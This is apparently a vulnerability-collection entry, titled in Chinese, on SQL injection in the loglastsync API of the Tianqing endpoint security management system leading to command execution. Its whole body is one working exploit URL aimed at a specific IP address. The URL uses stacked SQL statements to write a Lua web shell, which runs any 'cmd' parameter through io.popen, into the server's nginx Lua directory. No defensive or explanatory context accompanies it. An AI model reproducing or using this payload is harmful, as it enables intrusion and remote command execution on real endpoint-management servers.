# 天擎终端安全管理系统loglastsync方法SQL注入导致命令执行漏洞

    ```
http://114.113.151.164:28080/api/dp/loglastsync?ccid=a%27));create+table+O(T+TEXT);insert+into+O(T)+values('if+ngx.req.get_uri_args().cmd+then+cmd+=+ngx.req.get_uri_args().cmd+local+t+=+io.popen(cmd)+local+a+=+t:read("*all")+ngx.say(a)+end');copy+O(T)+to+'errornginx/lua/testb367.luac';drop+table+O;+--+aa
```
